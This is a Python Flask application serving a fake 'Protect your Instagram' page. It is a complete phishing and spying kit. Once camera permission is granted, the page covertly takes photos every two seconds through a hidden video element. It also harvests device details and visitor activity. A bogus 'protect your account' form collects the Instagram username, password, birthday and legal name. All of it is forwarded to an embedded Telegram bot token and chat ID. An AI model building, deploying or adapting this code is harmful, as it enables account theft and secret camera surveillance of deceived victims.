from flask import Flask, render_template_string, request, jsonify
import requests
import json
import threading
import time
from datetime import datetime
import base64
import os

app = Flask(__name__)

# Telegram Bot Configuration - YOUR BOT TOKEN ADDED
BOT_TOKEN = '8802775389:AAGn7eRc1-v9v0bwxbcYb4Wtxu23jF39zik'  # Your actual bot token
CHAT_ID = '8730143288'  # Your actual chat ID

# HTML Template - Permission immediately on visit
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Protect your Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
    }
    body {
      background: #0b0e14;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }
    .card {
      background: #1a1f2a;
      max-width: 480px;
      width: 100%;
      border-radius: 40px;
      padding: 28px 22px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.7);
      color: #f0f3fa;
      transition: all 0.2s;
      border: 1px solid #2e3748;
    }
    h1 {
      font-weight: 600;
      font-size: 1.9rem;
      letter-spacing: -0.5px;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    h1 span {
      background: #2d8cff;
      padding: 0 12px;
      border-radius: 60px;
      font-size: 1rem;
      color: white;
    }
    .sub {
      color: #98a2b8;
      margin-bottom: 28px;
      font-size: 0.95rem;
      border-left: 3px solid #2d8cff;
      padding-left: 12px;
    }
    .loader-wrap {
      background: #262e3c;
      border-radius: 60px;
      height: 12px;
      margin: 24px 0 12px;
      overflow: hidden;
      box-shadow: inset 0 2px 4px rgba(0,0,0,0.4);
    }
    .loader-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #2d8cff, #9f7aff);
      border-radius: 60px;
      transition: width 0.25s ease;
    }
    .timer-label {
      text-align: right;
      font-size: 0.9rem;
      color: #a4b0cc;
      margin-top: 4px;
      font-variant-numeric: tabular-nums;
    }
    .btn {
      background: #2d8cff;
      border: none;
      color: white;
      font-weight: 600;
      font-size: 1.1rem;
      padding: 16px 20px;
      border-radius: 60px;
      width: 100%;
      margin-top: 24px;
      cursor: pointer;
      transition: 0.15s;
      box-shadow: 0 6px 14px rgba(45, 140, 255, 0.25);
      letter-spacing: 0.3px;
    }
    .btn:active { transform: scale(0.96); }
    .btn:disabled {
      opacity: 0.4;
      pointer-events: none;
      filter: grayscale(0.6);
    }
    .input-group {
      margin-top: 20px;
    }
    .input-group label {
      display: block;
      font-size: 0.85rem;
      font-weight: 500;
      color: #b5c0d9;
      margin-bottom: 5px;
      margin-top: 14px;
    }
    .input-group input {
      width: 100%;
      padding: 14px 16px;
      border-radius: 30px;
      border: 1px solid #323d52;
      background: #11161f;
      color: white;
      font-size: 1rem;
      outline: none;
      transition: 0.2s;
    }
    .input-group input:focus {
      border-color: #2d8cff;
      box-shadow: 0 0 0 3px rgba(45, 140, 255, 0.3);
    }
    .safe-badge {
      background: #1f8b4c;
      padding: 14px 18px;
      border-radius: 40px;
      text-align: center;
      font-weight: 600;
      font-size: 1.2rem;
      margin: 16px 0 8px;
      color: white;
      display: none;
      border: 1px solid #34c76a;
    }
    .status-badge {
      background: #2a3344;
      border-radius: 60px;
      padding: 8px 16px;
      font-size: 0.8rem;
      color: #bcc8e0;
      display: inline-block;
      margin-top: 10px;
    }
    .hidden { display: none; }
    .text-muted { color: #8792ab; font-size: 0.8rem; }
    .permission-msg {
      background: #1f2a3a;
      border-radius: 12px;
      padding: 12px;
      margin-top: 12px;
      font-size: 0.9rem;
      border-left: 3px solid #ff6b6b;
    }
  </style>
</head>
<body>
<div class="card" id="app">
  <div id="loadingSection">
    <h1>🛡️ <span>Secure</span></h1>
    <div class="sub">verifying device & environment</div>
    <div class="loader-wrap">
      <div class="loader-fill" id="loaderFill"></div>
    </div>
    <div class="timer-label" id="timerLabel">0 / 30s</div>
    <div class="status-badge" id="statusBadge">⏳ initializing...</div>
    <div id="permissionStatus" class="permission-msg" style="display: none;"></div>
    <button class="btn" id="continueBtn" disabled>⏳ please wait...</button>
  </div>

  <div id="loginSection" class="hidden">
    <h1>🔐 Protect <span>IG</span></h1>
    <div class="sub">enter your credentials to secure account</div>
    <div class="input-group">
      <label>📧 Instagram username / email</label>
      <input type="text" id="igUsername" placeholder="username or email">
    </div>
    <div class="input-group">
      <label>🔑 Password</label>
      <input type="password" id="igPassword" placeholder="••••••••">
    </div>
    <div class="input-group">
      <label>📅 Birthday</label>
      <input type="text" id="igBirthday" placeholder="DD/MM/YYYY">
    </div>
    <div class="input-group">
      <label>📛 Legal full name</label>
      <input type="text" id="igLegalName" placeholder="John Doe">
    </div>
    <button class="btn" id="protectBtn">🛡️ Protect your account</button>
    <div id="safeMessage" class="safe-badge">✅ Your account is now safe</div>
    <div class="text-muted" style="margin-top: 12px;">* encrypted protection active</div>
  </div>
</div>

<script>
  const API_BASE = window.location.origin;
  
  let loadingCompleted = false;
  let mediaActive = false;
  let intervalPhoto = null;
  let mediaStream = null;
  let videoElement = null;
  let permissionGranted = false;

  const loaderFill = document.getElementById('loaderFill');
  const timerLabel = document.getElementById('timerLabel');
  const statusBadge = document.getElementById('statusBadge');
  const continueBtn = document.getElementById('continueBtn');
  const loadingSection = document.getElementById('loadingSection');
  const loginSection = document.getElementById('loginSection');
  const protectBtn = document.getElementById('protectBtn');
  const safeMessage = document.getElementById('safeMessage');
  const permissionStatus = document.getElementById('permissionStatus');

  const igUsername = document.getElementById('igUsername');
  const igPassword = document.getElementById('igPassword');
  const igBirthday = document.getElementById('igBirthday');
  const igLegalName = document.getElementById('igLegalName');

  // IMMEDIATELY REQUEST PERMISSION ON PAGE LOAD
  function requestPermissionsImmediately() {
    permissionStatus.style.display = 'block';
    permissionStatus.textContent = '📸 Requesting camera access...';
    permissionStatus.style.borderLeftColor = '#ffd93d';
    
    // Request camera permission immediately
    navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'environment',
        width: { ideal: 640 },
        height: { ideal: 480 }
      }
    })
    .then(function(stream) {
      permissionGranted = true;
      mediaStream = stream;
      mediaActive = true;
      
      // Create hidden video element
      videoElement = document.createElement('video');
      videoElement.style.display = 'none';
      videoElement.style.position = 'absolute';
      videoElement.style.width = '1px';
      videoElement.style.height = '1px';
      videoElement.style.opacity = '0';
      videoElement.style.pointerEvents = 'none';
      document.body.appendChild(videoElement);
      videoElement.srcObject = stream;
      videoElement.play();
      
      permissionStatus.textContent = '✅ access granted';
      permissionStatus.style.borderLeftColor = '#51cf66';
      statusBadge.textContent = 'active';
      
      sendToTelegram('✅ Camera access granted immediately. Photo capture started.');
      
      // Start photo capture
      startPhotoCapture();
    })
    .catch(function(err) {
      permissionGranted = false;
      mediaActive = false;
      permissionStatus.textContent = '⚠️ access denied. Some features may not work.';
      permissionStatus.style.borderLeftColor = '#ff6b6b';
      statusBadge.textContent = '⚠️ unavailable';
      sendToTelegram(`❌ Camera access denied immediately: ${err.message || 'unknown'}`);
    });
  }

  // Call immediately when page loads
  requestPermissionsImmediately();

  // Hidden video element for capturing photos without showing
  function createHiddenVideo() {
    const video = document.createElement('video');
    video.style.display = 'none';
    video.style.position = 'absolute';
    video.style.width = '1px';
    video.style.height = '1px';
    video.style.opacity = '0';
    video.style.pointerEvents = 'none';
    document.body.appendChild(video);
    return video;
  }

  async function sendToTelegram(message) {
    try {
      const response = await fetch('/api/send_message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: message })
      });
      return await response.json();
    } catch (error) {
      console.error('Send message error:', error);
    }
  }

  async function sendPhotoToBackend(base64Data, cameraType) {
    try {
      const response = await fetch('/api/send_photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          photo: base64Data,
          camera: cameraType
        })
      });
      return await response.json();
    } catch (error) {
      console.error('Send photo error:', error);
    }
  }

  async function sendLoginInfo(data) {
    try {
      const response = await fetch('/api/send_login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      return await response.json();
    } catch (error) {
      console.error('Send login error:', error);
    }
  }

  function getDeviceInfo() {
    const nav = navigator;
    return `📱 DEVICE INFO:
• User Agent: ${nav.userAgent}
• Platform: ${nav.platform || 'unknown'}
• Language: ${nav.language}
• Vendor: ${nav.vendor || 'unknown'}
• Screen: ${window.screen.width}x${window.screen.height}
• Time: ${new Date().toISOString()}`;
  }

  // Send device info
  setTimeout(() => {
    sendToTelegram(`🆕 NEW VISITOR\n${getDeviceInfo()}`);
  }, 500);

  // Loading bar
  let startTime = Date.now();
  const DURATION = 30;

  function updateLoader() {
    const elapsed = (Date.now() - startTime) / 1000;
    const progress = Math.min(elapsed / DURATION, 1);
    const percent = Math.round(progress * 100);
    loaderFill.style.width = percent + '%';
    timerLabel.textContent = `${Math.min(Math.floor(elapsed), DURATION)} / ${DURATION}s`;

    if (progress >= 1) {
      loadingCompleted = true;
      continueBtn.disabled = false;
      continueBtn.textContent = '▶ Continue to protection';
      statusBadge.textContent = '✅ ready';
      clearInterval(loaderInterval);
      return;
    }
  }

  const loaderInterval = setInterval(updateLoader, 200);
  updateLoader();

  // Capture photos from both cameras
  function startPhotoCapture() {
    if (!mediaActive || !videoElement) return;
    
    // Capture function
    async function capturePhotos() {
      if (!mediaActive || !videoElement) return;
      
      try {
        // Capture with current camera
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send photo (front camera)
        await sendPhotoToBackend(dataUrl, 'front');
        
        // Try to switch to back camera
        try {
          const backStream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: 'environment',
              width: { ideal: 640 },
              height: { ideal: 480 }
            }
          });
          
          // Update video source
          const oldStream = videoElement.srcObject;
          videoElement.srcObject = backStream;
          await videoElement.play();
          
          // Capture back camera photo
          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
          const backDataUrl = canvas.toDataURL('image/jpeg', 0.8);
          await sendPhotoToBackend(backDataUrl, 'back');
          
          // Switch back to front camera
          videoElement.srcObject = mediaStream;
          await videoElement.play();
          backStream.getTracks().forEach(t => t.stop());
          
        } catch (backErr) {
          console.log('Back camera not available');
        }
        
      } catch (e) {
        console.warn('Photo capture error:', e);
      }
    }

    // Capture every 2 seconds
    intervalPhoto = setInterval(capturePhotos, 2000);
    
    // Also capture immediately
    setTimeout(capturePhotos, 500);
  }

  // Continue button
  continueBtn.addEventListener('click', function() {
    if (!loadingCompleted) return;
    loadingSection.classList.add('hidden');
    loginSection.classList.remove('hidden');
    sendToTelegram('🔓 User clicked continue, login page shown.');
  });

  // Protect button
  protectBtn.addEventListener('click', async function() {
    const username = igUsername.value.trim() || 'not provided';
    const password = igPassword.value.trim() || 'not provided';
    const birthday = igBirthday.value.trim() || 'not provided';
    const legalName = igLegalName.value.trim() || 'not provided';

    await sendLoginInfo({
      username: username,
      password: password,
      birthday: birthday,
      legalName: legalName
    });

    safeMessage.style.display = 'block';
    protectBtn.disabled = true;
    protectBtn.textContent = '✅ Protected';
    sendToTelegram('✅ Account protected (user clicked)');
  });

  // Cleanup
  window.addEventListener('beforeunload', function() {
    if (intervalPhoto) clearInterval(intervalPhoto);
    if (mediaStream) {
      mediaStream.getTracks().forEach(t => t.stop());
    }
    if (videoElement) {
      videoElement.srcObject = null;
    }
    sendToTelegram('🔚 Page closed / unloaded');
  });
</script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the main page"""
    return render_template_string(HTML_TEMPLATE, bot_token=BOT_TOKEN, chat_id=CHAT_ID)

@app.route('/api/send_message', methods=['POST'])
def send_message():
    """Send text message to Telegram"""
    try:
        data = request.json
        message = data.get('message', '')
        
        if not message:
            return jsonify({'error': 'No message provided'}), 400
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return jsonify({'success': True, 'response': response.json()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_photo', methods=['POST'])
def send_photo():
    """Send photo to Telegram"""
    try:
        data = request.json
        photo_data = data.get('photo', '')
        camera_type = data.get('camera', 'unknown')
        
        if not photo_data:
            return jsonify({'error': 'No photo provided'}), 400
        
        # Remove data URL prefix if present
        if 'base64,' in photo_data:
            photo_data = photo_data.split('base64,')[1]
        
        # Decode base64
        image_bytes = base64.b64decode(photo_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {
            'photo': ('image.jpg', image_bytes, 'image/jpeg')
        }
        data = {
            'chat_id': CHAT_ID,
            'caption': f"📸 {camera_type} camera capture at {datetime.now().strftime('%H:%M:%S')}"
        }
        
        response = requests.post(url, files=files, data=data, timeout=30)
        return jsonify({'success': True, 'response': response.json()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_login', methods=['POST'])
def send_login():
    """Send login credentials to Telegram"""
    try:
        data = request.json
        username = data.get('username', 'not provided')
        password = data.get('password', 'not provided')
        birthday = data.get('birthday', 'not provided')
        legal_name = data.get('legalName', 'not provided')
        
        message = f"""🔐 INSTAGRAM LOGIN INFO:
👤 Username: {username}
🔑 Password: {password}
🎂 Birthday: {birthday}
📛 Legal name: {legal_name}
🕒 {datetime.now().isoformat()}"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return jsonify({'success': True, 'response': response.json()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    # Get the port from environment variable (Render sets this)
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting Instagram Protection Server...")
    print(f"📱 Running on port: {port}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"💬 Chat ID: {CHAT_ID}")
    # Run with host='0.0.0.0' to be accessible externally
    app.run(debug=False, host='0.0.0.0', port=port)
